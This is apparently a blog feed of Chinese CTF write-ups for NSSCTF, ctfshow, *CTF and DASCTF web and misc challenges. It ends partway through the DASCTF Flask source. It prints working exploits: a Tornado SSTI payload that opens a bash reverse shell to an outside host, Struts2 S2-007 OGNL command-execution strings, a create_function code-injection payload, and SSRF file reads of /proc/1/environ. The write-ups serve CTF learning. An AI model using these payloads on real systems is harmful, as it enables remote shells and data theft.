class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>需要自备一个上传的前端。</p><p>上传时，上传的文件名为<code>xxx.php/.</code>，即可让<code>$ext</code>的值为空，从而绕过waf。需要注意的是，要对文件名来一次url编码，不然会出错。（题目对文件名来了一个<code>urldecode</code>也算是一个提醒吧）。flag就在环境变量里。</p><p><img src="/NSSCTF_2nd_WP/1_1.png" alt="上传时"></p><p><img src="/NSSCTF_2nd_WP/1_2.png" alt="上传成功"></p><h2 id="2周年快乐！"><a href="#2周年快乐！" class="headerlink" title="2周年快乐！"></a>2周年快乐！</h2><p>纯前端的win12，要和出题人对个脑洞（</p><ol><li><p>在D盘的<code>NSSCTF_2nd_WriteUp</code>文件夹里里发现一个hint。</p><p><img src="/NSSCTF_2nd_WP/2_1.png"></p></li><li><p>在桌面的获取FLAG中得到另一个有用的信息。</p><p><img src="/NSSCTF_2nd_WP/2_2.png"></p></li><li><p>结合上述条件，可以猜测是在终端里执行<code>curl https://www.nssctf.cn/flag</code>。</p></li><li><p>打开终端，输入队伍的<code>token</code>，然后输入<code>curl https://www.nssctf.cn/flag</code>，即可将flag发到队长的站内邮箱里，去查看站内消息就能看到flag了。</p><p><img src="/NSSCTF_2nd_WP/2_3.png"></p><p><img src="/NSSCTF_2nd_WP/2_4.png"></p></li></ol><h2 id="MyBox"><a href="#MyBox" class="headerlink" title="MyBox"></a>MyBox</h2><p>这个题存在非预期，用到非预期做的。</p><ol><li><p>打开题目，只看到一个<code>/?url=dosth</code>。</p></li><li><p>猜测是ssrf，使用file协议尝试读文件，发现能读。<code>/?url=file:///etc/passwd</code></p><p><img src="/NSSCTF_2nd_WP/3_1.png"></p></li><li><p>读<code>/proc/1/environ</code>，即可得到flag。</p><p><img src="/NSSCTF_2nd_WP/3_2.png"></p></li></ol><h2 id="MyHurricane"><a href="#MyHurricane" class="headerlink" title="MyHurricane"></a>MyHurricane</h2><p>tornado的ssti，狠狠地学习了一波。</p><p>参考链接：<a href="https://blog.csdn.net/miuzzx/article/details/123329244">tornado模板注入</a></p><p>​   <a href="https://tornado-zh.readthedocs.io/zh/latest/index.html">Tornado 官方文档</a></p><ol><li><p>源码：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> tornado.ioloop</span><br><span class="line"><span class="keyword">import</span> tornado.web</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">BASE_DIR = os.path.dirname(__file__)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">waf</span>(<span class="params">data</span>):</span><br><span class="line">    bl = [<span class="string">&#x27;\&#x27;&#x27;</span>, <span class="string">&#x27;&quot;&#x27;</span>, <span class="string">&#x27;__&#x27;</span>, <span class="string">&#x27;(&#x27;</span>, <span class="string">&#x27;)&#x27;</span>, <span class="string">&#x27;or&#x27;</span>, <span class="string">&#x27;and&#x27;</span>, <span class="string">&#x27;not&#x27;</span>, <span class="string">&#x27;&#123;&#123;&#x27;</span>, <span class="string">&#x27;&#125;&#125;&#x27;</span>]</span><br><span class="line">    <span class="keyword">for</span> c <span class="keyword">in</span> bl:</span><br><span class="line">        <span class="keyword">if</span> c <span class="keyword">in</span> data:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">for</span> chunk <span class="keyword">in</span> data.split():</span><br><span class="line">        <span class="keyword">for</span> c <span class="keyword">in</span> chunk:</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> (<span class="number">31</span> &lt; <span class="built_in">ord</span>(c) &lt; <span class="number">128</span>):</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">IndexHandler</span>(tornado.web.RequestHandler):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">get</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(__file__, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">            self.finish(f.read())</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">post</span>(<span class="params">self</span>):</span><br><span class="line">        data = self.get_argument(<span class="string">&quot;ssti&quot;</span>)</span><br><span class="line">        <span class="keyword">if</span> waf(data):</span><br><span class="line">            <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;1.html&#x27;</span>, <span class="string">&#x27;w&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">                f.write(<span class="string">f&quot;&quot;&quot;&lt;html&gt;</span></span><br><span class="line"><span class="string">                        &lt;head&gt;&lt;/head&gt;</span></span><br><span class="line"><span class="string">                        &lt;body style=&quot;font-size: 30px;&quot;&gt;<span class="subst">&#123;data&#125;</span>&lt;/body&gt;&lt;/html&gt;</span></span><br><span class="line"><span class="string">                        &quot;&quot;&quot;</span>)</span><br><span class="line">                f.flush()</span><br><span class="line">            self.render(<span class="string">&#x27;1.html&#x27;</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            self.finish(<span class="string">&#x27;no no no&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    app = tornado.web.Application([</span><br><span class="line">            (<span class="string">r&quot;/&quot;</span>, IndexHandler),</span><br><span class="line">        ], compiled_template_cache=<span class="literal">False</span>)</span><br><span class="line">    app.listen(<span class="number">827</span>)</span><br><span class="line">    tornado.ioloop.IOLoop.current().start()</span><br></pre></td></tr></table></figure></li><li><p>从源码可以看到，post的<code>ssti</code>参数那里存在ssti。</p></li><li><p>过滤了<code>&#123;&#123;`、`&#125;&#125;</code>、<code>(</code>、<code>)</code>、单双引号，极其麻烦。</p></li><li><p>先学习一波，学习的时候在本地调试，可以发现在无过滤的情况下，该ssti是可以直接执行<code>eval</code>的，但在前端是没有回显的，只返回500，但能在后台执行命令。</p><p><img src="/NSSCTF_2nd_WP/4_1.png"></p><p><img src="/NSSCTF_2nd_WP/4_2.png"></p></li><li><p>由于过滤了一些东西，我们需要做一些替换，用<code>&#123;% %&#125;</code>代替<code>&#123;&#123; &#125;&#125;</code>，在文章的下面我们还看到能绕小括号的方法。</p><p><img src="/NSSCTF_2nd_WP/4_3.png"></p></li><li><p>由此我们可以发现，我们可以不用括号执行<code>eval</code>，而前面的<code>&#39;print(123)&#39;</code>是<code>eval</code>的参数，那么我们从别处接收到参数，即可绕过小括号的限制。</p></li><li><p>在文章的中间讲了<code>request</code>的用法，因此我们可以利用<code>request</code>来传递<code>eval</code>的参数。</p><p><img src="/NSSCTF_2nd_WP/4_4.png"></p></li><li><p>我们在本地尝试用<code>request.query</code>，发现能成功执行命令。</p><p><img src="/NSSCTF_2nd_WP/4_5.png"></p><p><img src="/NSSCTF_2nd_WP/4_6.png"></p></li><li><p>从上边的调试中，我们成功突破了限制，在服务器执行了命令，接下来能成功反弹shell就行了。</p></li><li><p>在文章的末尾，我们看到了一个这样的payload，我们直接拿来用就行了</p><p><img src="/NSSCTF_2nd_WP/4_7.png"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">__import__(&#x27;os&#x27;).system(&#x27;bash -i &gt;&amp; /dev/tcp/xxx/xxx 0&gt;&amp;1&#x27;)%0a&quot;&quot;&quot;%0a&amp;data=&#123;%autoescape None%&#125;&#123;% raw request.body%0a    _tt_utf8=exec%&#125;&amp;%0a&quot;&quot;&quot;</span><br></pre></td></tr></table></figure></li><li><p>我们修改一下，把%0a替换成回车，把<code>data</code>替换成<code>ssti</code>，再填上反弹服务器的地址和端口，即可成功反弹shell。</p><p>payload:</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">__import__(&#x27;os&#x27;).system(&#x27;bash -c \&#x27;bash -i &gt;&amp; /dev/tcp/7654du6216.zicp.fun/33699 0&gt;&amp;1\&#x27;&#x27;)</span><br><span class="line">&quot;&quot;&quot;</span><br><span class="line">&amp;ssti=&#123;%autoescape None%&#125;&#123;% raw request.body%0a    _tt_utf8=exec%&#125;&amp;</span><br><span class="line">&quot;&quot;&quot;</span><br></pre></td></tr></table></figure><p><img src="/NSSCTF_2nd_WP/4_8.png"></p></li><li><p>解释一下payload，<code>&#123;%autoescape None%&#125;&#123;%raw ...%&#125;</code>可以等同于<code>&#123;&#123; &#125;&#125;</code>，这个在官方文档中有写。</p><p><img src="/NSSCTF_2nd_WP/4_9.png"></p></li><li><p><code>request.body</code>返回的是请求的主体，可以理解为返回了post里的所有内容。而下面的<code>&quot;&quot;&quot;</code>则是起注释作用，把我们不需要的部分注释掉，防止出错。</p></li></ol>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> NSSCTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> write up </tag>
            
            <tag> WEB </tag>
            
            <tag> NSSCTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ctfshow红包挑战7_WP</title>
      <link href="/ctfshow%E7%BA%A2%E5%8C%85%E6%8C%91%E6%88%987-WP/"/>
      <url>/ctfshow%E7%BA%A2%E5%8C%85%E6%8C%91%E6%88%987-WP/</url>
      
        <content type="html"><![CDATA[<p>赛后复现</p><p>官方wp：<a href="https://ctf-show.feishu.cn/docx/IZh0deravoLG66xCrJ6caezNnKc">https://ctf-show.feishu.cn/docx/IZh0deravoLG66xCrJ6caezNnKc</a></p><h1 id="1、源码"><a href="#1、源码" class="headerlink" title="1、源码"></a>1、源码</h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">2</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">extract</span>(<span class="variable">$_GET</span>);</span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="variable">$name</span>,<span class="variable">$value</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">system</span>(</span><br><span class="line">    <span class="string">&quot;ls &#x27;&quot;</span>.<span class="title function_ invoke__">filter</span>(<span class="variable">$_GET</span>[<span class="number">1</span>]).<span class="string">&quot;&#x27;&quot;</span></span><br><span class="line">);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params"><span class="variable">$cmd</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$cmd</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;&#x27;&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="variable">$cmd</span>);</span><br><span class="line">    <span class="variable">$cmd</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;\\&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="variable">$cmd</span>);</span><br><span class="line">    <span class="variable">$cmd</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;`&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="variable">$cmd</span>);</span><br><span class="line">    <span class="variable">$cmd</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;$&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="variable">$cmd</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$cmd</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="2、题目解析"><a href="#2、题目解析" class="headerlink" title="2、题目解析"></a>2、题目解析</h1><p>1.存在<code>extract($_GET);</code>可以变量覆盖，<code>ini_set</code>可以修改<code>php.ini</code>的部分配置信息，<code>filter</code>函数将 ‘ （单引号）、 \ （反斜杠）、&#96; (反引号) 、$ 都替换成空。</p><p>2.常规思路是闭合掉 ‘ （单引号）,然后利用 ; （分号）执行其他bash命令，但 ‘ （单引号）用不了，无法闭合，因此此方法不行。</p><p>3.修改<code>error_log</code>的保存路径为<code>/var/www/html/3.php</code>，利用报错将报错信息写入，在报错信息中包含想要执行的php代码，从而实现getshell。</p><p>4.<code>system</code>刚好可以用0字节进行截断来触发异常，在异常中加入php代码。</p><p><img src="/ctfshow%E7%BA%A2%E5%8C%85%E6%8C%91%E6%88%987-WP/1.png"></p><p>5.之后访问<code>3.php</code>，即可看到flag。</p><p><img src="/ctfshow%E7%BA%A2%E5%8C%85%E6%8C%91%E6%88%987-WP/2.png"></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> 红包挑战 </category>
          
          <category> ctfshow </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> write up </tag>
            
            <tag> WEB </tag>
            
            <tag> ctfshow </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ctfshow红包挑战8_WP</title>
      <link href="/ctfshow%E7%BA%A2%E5%8C%85%E6%8C%91%E6%88%988-WP/"/>
      <url>/ctfshow%E7%BA%A2%E5%8C%85%E6%8C%91%E6%88%988-WP/</url>
      
        <content type="html"><![CDATA[<p>官方WP：<a href="https://ctf-show.feishu.cn/docx/Uy3xdlo9koLQtyxnlUGcpIxunUh?from=from_copylink">https://ctf-show.feishu.cn/docx/Uy3xdlo9koLQtyxnlUGcpIxunUh?from=from_copylink</a></p><h1 id="1、源码"><a href="#1、源码" class="headerlink" title="1、源码"></a>1、源码</h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2023-08-08 00:12:34</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2023-08-08 00:26:48</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">extract</span>(<span class="variable">$_GET</span>);</span><br><span class="line"><span class="title function_ invoke__">create_function</span>(<span class="variable">$name</span>,<span class="title function_ invoke__">base64_encode</span>(<span class="variable">$value</span>))();</span><br></pre></td></tr></table></figure><h1 id="2、分析过程："><a href="#2、分析过程：" class="headerlink" title="2、分析过程："></a>2、分析过程：</h1><ol><li><code>extract($_GET);</code>能够实现变量覆盖，可以给<code>$name</code>和<code>$value</code>赋值。</li><li>存在<code>create_function</code>函数，可以通过这个实现rce。</li><li>若不存在<code>base64_encode</code>则可以通过<code>$value</code>实现rce，由于<code>$value</code>被<code>base64_encode</code>破坏，导致不可控，因此可以考虑使用<code>$name</code>。</li><li>参考这篇博客 <a href="https://blog.csdn.net/soldi_er/article/details/116244642?csdn_share_tail=%7B%22type%22:%22blog%22,%22rType%22:%22article%22,%22rId%22:%22116244642%22,%22source%22:%22m0_74044466%22%7D&fromshare=blogdetail">匿名函数create_function()代码注入</a> ，只要<code>create_function</code>的形参有一个可控，都能执行php代码。</li></ol><h1 id="3、create-function"><a href="#3、create-function" class="headerlink" title="3、create_function"></a>3、<code>create_function</code></h1><p>对于<code>create_function</code>函数，不能把它当成一个普通的函数看待，而是应该当成一个函数的定义过程。</p><p>比如：</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">create_function</span>(<span class="variable">$a</span>,<span class="variable">$b</span>);</span><br><span class="line">等同于</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">xxxx</span>(<span class="params">   <span class="variable">$a</span>   </span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="variable">$b</span>;</span><br><span class="line">&#125;</span><br><span class="line">其中xxxx为匿名函数的函数名，<span class="variable">$a</span>为形参，<span class="variable">$b</span>为函数内执行的代码</span><br></pre></td></tr></table></figure><p>由此我们可以想，提前闭合<code>create_function</code>，结束这个函数，那么不久能将php代码逃逸出来了么</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">create_function</span>( <span class="variable">$a</span> , <span class="variable">$b</span> );</span><br><span class="line">若<span class="variable">$a</span>=<span class="string">&quot;)&#123;&#125;phpinfo();/*&quot;</span></span><br><span class="line">则等同于</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">xxxx</span>(<span class="params">      </span>)</span>&#123;&#125;<span class="title function_ invoke__">phpinfo</span>();<span class="comment">/*      )</span></span><br><span class="line"><span class="comment">&#123;</span></span><br><span class="line"><span class="comment">$b;</span></span><br><span class="line"><span class="comment">&#125;</span></span><br><span class="line"><span class="comment"></span></span><br></pre></td></tr></table></figure><p>可以发现<code>phpinfo</code>逃了出来，为了不报错，使用<code>/*</code>（或者<code>//</code>）把后面的所有代码都注释掉，由此可以实现rce。</p><h1 id="4、payload"><a href="#4、payload" class="headerlink" title="4、payload"></a>4、payload</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?name=)&#123;&#125;system(&quot;cat /f*&quot;);//</span><br></pre></td></tr></table></figure><p><img src="/ctfshow%E7%BA%A2%E5%8C%85%E6%8C%91%E6%88%988-WP/1.png"></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> 红包挑战 </category>
          
          <category> ctfshow </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> write up </tag>
            
            <tag> WEB </tag>
            
            <tag> ctfshow </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>※CTF</title>
      <link href="/%E2%80%BBCTF/"/>
      <url>/%E2%80%BBCTF/</url>
      
        <content type="html"><![CDATA[<h1 id="web"><a href="#web" class="headerlink" title="web"></a>web</h1><h2 id="jwt2struts"><a href="#jwt2struts" class="headerlink" title="jwt2struts"></a>jwt2struts</h2><ol><li>F12，发现提示。</li></ol><p><img src="/%E2%80%BBCTF/%E4%B8%80.1.1.png"></p><ol start="2"><li><p>进入<code>JWT_key.php</code>，得到源码。</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;./secret_key.php&quot;</span>;</span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;./salt.php&quot;</span>;</span><br><span class="line"><span class="comment">//$salt = XXXXXXXXXXXXXX // the salt include 14 characters</span></span><br><span class="line"><span class="comment">//md5($salt.&quot;adminroot&quot;)=e6ccbf12de9d33ec27a5bcfb6a3293df</span></span><br><span class="line">@<span class="variable">$username</span> = <span class="title function_ invoke__">urldecode</span>(<span class="variable">$_POST</span>[<span class="string">&quot;username&quot;</span>]);</span><br><span class="line">@<span class="variable">$password</span> = <span class="title function_ invoke__">urldecode</span>(<span class="variable">$_POST</span>[<span class="string">&quot;password&quot;</span>]);</span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">empty</span>(<span class="variable">$_COOKIE</span>[<span class="string">&quot;digest&quot;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$username</span> === <span class="string">&quot;admin&quot;</span> &amp;&amp; <span class="variable">$password</span> != <span class="string">&quot;root&quot;</span>) &#123;</span><br><span class="line">         <span class="keyword">if</span> (<span class="variable">$_COOKIE</span>[<span class="string">&quot;digest&quot;</span>] === <span class="title function_ invoke__">md5</span>(<span class="variable">$salt</span>.<span class="variable">$username</span>.<span class="variable">$password</span>)) &#123;</span><br><span class="line">            <span class="keyword">die</span> (<span class="string">&quot;The secret_key is &quot;</span>. <span class="variable">$secret_key</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">die</span> (<span class="string">&quot;Your cookies don&#x27;t match up! STOP HACKING THIS SITE.&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">die</span> (<span class="string">&quot;no no no&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure></li><li><p>根据源码，可以知道<code>salt</code>长度为14，常规做法是把<code>salt</code>爆破出来。可以利用  <a href="https://blog.csdn.net/qq_45290991/article/details/120400363">hash长度拓展攻击</a> 来绕过验证，从而得到<code>secret_key</code>。</p></li><li><p>利用<code>hashpump</code>生成新的<code>MD5</code>和<code>password</code>。</p><p><img src="/%E2%80%BBCTF/%E4%B8%80.1.2.png"></p></li><li><p>把<code>\x</code>换成<code>%</code>，用bp发送过去，即可得到<code>secret_key</code>。、</p><p><img src="/%E2%80%BBCTF/%E4%B8%80.1.3.png"></p></li><li><p>回到开始的页面，开始伪造<code>jwt</code>。拿到cookie，去 jwt.io 将user改成admin。</p><p><img src="/%E2%80%BBCTF/%E4%B8%80.1.4.png"></p></li><li><p>将<code>access_token</code>的值改成新伪造好的值，即可进入下面这个页面。</p><p>​<img src="/%E2%80%BBCTF/%E4%B8%80.1.5.png"></p></li><li><p>根据题目名称，前面是jwt了，那么后面是struts2，源码中也有提示。</p></li><li><p>经过测试，是<code>S2-007</code>， <a href="https://blog.csdn.net/q20010619/article/details/120729447">ctfshow web281-S2-007</a> 。</p><p>执行任意代码poc:</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#x27; + (#_memberAccess[&quot;allowStaticMethodAccess&quot;]=true,#foo=new java.lang.Boolean(&quot;false&quot;) ,#context[&quot;xwork.MethodAccessor.denyMethodExecution&quot;]=#foo,@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec(&#x27;id&#x27;).getInputStream())) + &#x27;</span><br></pre></td></tr></table></figure><p>传入后即可执行<code>id</code>并回显。</p><p><img src="/%E2%80%BBCTF/%E4%B8%80.1.6.png"></p></li><li><p>执行命令<code>env</code>查看环境变量，即可得到flag。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#x27; + (#_memberAccess[&quot;allowStaticMethodAccess&quot;]=true,#foo=new java.lang.Boolean(&quot;false&quot;) ,#context[&quot;xwork.MethodAccessor.denyMethodExecution&quot;]=#foo,@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec(&#x27;env&#x27;).getInputStream())) + &#x27;</span><br></pre></td></tr></table></figure><p><img src="/%E2%80%BBCTF/%E4%B8%80.1.7.png"></p></li></ol><h1 id="misc"><a href="#misc" class="headerlink" title="misc"></a>misc</h1><h2 id="snippingTools"><a href="#snippingTools" class="headerlink" title="snippingTools"></a>snippingTools</h2><ol><li><p>题目描述：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Alice在参加某个CTF比赛，她成功的解出了一道题，拿到了flag。她很开心，迫不及待地想要向Bob分享她的喜悦。于是按下了快捷键Shift+Win+S使用了Windows 11的截图工具，截取了整个屏幕，并且保存为文件1.png。然后，考虑到比赛规则中规定flag需要保密，她使用了截图工具中的“裁剪”功能，将flag裁剪掉了一部分，然后将裁剪结果覆盖了原文件1.png并保存。最终，她将1.png发给了Bob。Bob马上就知道了她的整个flag，你知道是如何做到的吗？</span><br></pre></td></tr></table></figure></li><li><p>题目附件：</p><p><img src="/%E2%80%BBCTF/1.png"></p></li><li><p>用必应搜索一下，发现有cve，得到cve编号为<code>CVE-2023-28303</code>。</p><p><img src="/%E2%80%BBCTF/misc.1.3.png"></p></li><li><p>在github上搜索是否有可用工具，搜索到了<a href="https://github.com/frankthetank-music/Acropalypse-Multi-Tool">这个工具</a>，后边是利用这个工具还原图片。</p><p><img src="/%E2%80%BBCTF/misc.1.1.png"></p><p><img src="/%E2%80%BBCTF/misc.1.2.png"></p></li></ol><h2 id="old-language"><a href="#old-language" class="headerlink" title="old language"></a>old language</h2><ol><li><p>附件：</p><p><img src="/%E2%80%BBCTF/task.png"></p></li><li><p>依照 <a href="https://ja.fonts2u.com/dovahkiin.%E3%83%95%E3%82%A9%E3%83%B3%E3%83%88">这个网站</a> 上的内容，对应图片上的图案，即可得到flag为<code>gikrvzy</code></p><p><img src="/%E2%80%BBCTF/misc.2.1.png"></p></li></ol>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> 比赛 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> write up </tag>
            
            <tag> WEB </tag>
            
            <tag> *CTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>DASCTF</title>
      <link href="/DASCTF/"/>
      <url>/DASCTF/</url>
      
        <content type="html"><![CDATA[<h1 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h1><h2 id="EzFlask"><a href="#EzFlask" class="headerlink" title="EzFlask"></a>EzFlask</h2><ol><li><p>源码</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">import</span> uuid</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request, session</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> black_list</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line">app.secret_key = <span class="built_in">str</span>(uuid.uuid4())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">check</span>(<span class="params">data</span>):</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> black_list:</span><br><span class="line">        <span class="keyword">if</span> i <span class="keyword">in</span> data:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">merge</span>(<span class="params">src, dst</span>):</span><br><span class="line">    <span class="keyword">for</span> k, v <span class="keyword">in</span> src.items():</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">hasattr</span>(dst, <span class="string">&#x27;__getitem__&#x27;</span>):</span><br><span class="line">            <span class="keyword">if</span> dst.get(k) <span class="keyword">and</span> <span class="built_in">type</span>(v) == <span class="built_in">dict</span>:</span><br><span class="line">                merge(v, dst.get(k))</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                dst[k] = v</span><br><span class="line">        <span class="keyword">elif</span> <span class="built_in">hasattr</span>(dst, k) <span class="keyword">and</span> <span class="built_in">type</span>(v) == <span class="built_in">dict</span>:</span><br><span class="line">            merge(v, <span class="built_in">getattr</span>(dst, k))</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">setattr</span>(dst, k, v)</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">user</span>():</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        self.username = <span class="string">&quot;&quot;</span></span><br><span class="line">        self.password = <span class="string">&quot;&quot;</span></span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">check</span>(<span class="params">self, data</span>):</span><br><span class="line">        <span class="keyword">if</span> self.username == data[<span class="string">&#x27;username&#x27;</span>] <span class="keyword">and</span> self.password == data[<span class="string">&#x27;password&#x27;</span>]:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">Users = []</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/register&#x27;</span>,methods=[<span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">register</span>():</span><br><span class="line">    <span class="keyword">if</span> request.data:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> check(request.data):</span><br><span class="line">                <span class="keyword">return</span> <span class="string">&quot;Register Failed&quot;</span></span><br><span class="line">            data = json.loads(request.data)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;username&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> data <span class="keyword">or</span> <span class="string">&quot;password&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> data:</span><br><span class="line">                <span class="keyword">return</span> <span class="string">&quot;Register Failed&quot;</span></span><br><span class="line">            User = user()</span><br><span class="line">            merge(data, User)</span><br><span class="line">            Users.append(User)</span><br><span class="line">        <span class="keyword">except</span> Exception:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;Register Failed&quot;</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Register Success&quot;</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Register Failed&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/login&#x27;</span>,methods=[<span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">login</span>():</span><br><span class="line">    <span 